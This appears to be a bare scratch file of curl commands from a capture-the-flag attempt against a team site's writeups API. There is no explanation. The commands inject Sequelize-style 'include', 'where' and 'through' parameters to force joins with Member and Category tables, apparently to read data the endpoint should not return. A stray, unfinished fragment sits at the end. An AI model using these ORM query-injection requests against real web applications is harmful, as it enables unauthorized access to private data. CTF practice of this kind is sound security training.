https://erm.be.ax/api/writeups?include%5B0%5D%5Bassociation%5D=Member&include%5Bright%5D=true


curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'include[0][where][required]=false'

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][required]=false' \
    --data-urlencode '[where][$Member.username$]=goroo' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'include[0][include][0][required]=false' 

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'subquery=false' \
    --data-urlencode '[where][$Member.username$]=FizzBuzz101' 

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode '[where][$MemberCategory.CategoryName$]=pwn' 

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][through][where][username]=FizzBuzz101'

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][where][$Member.username$]=FizzBuzz101' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'include[0][include][0][include][0][association]=Members'

curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][where][username]=drakon' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'include[0][include][0][include][0][association]=Member' \
    --data-urlencode 'include[0][include][0][include][0][required]=true'


curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][t]=Category' 


curl -G 'https://erm.be.ax/api/writeups' \
    --data-urlencode 'include[0][association]=Member' \
    --data-urlencode 'include[0][required]=false' \
    --data-urlencode 'include[0][include][0][association]=Categories' \
    --data-urlencode 'include[0][include][0][through][model]=MemberCategory' \
    --data-urlencode 'include[0][include][0][include][0][association]=Members' \
    --data-urlencode 'include[0][include][0][include][0][through][model]=MemberCategory'

     \
    --data-urlencode 'include[0][include][0][include][0][through]=MemberCategory' 
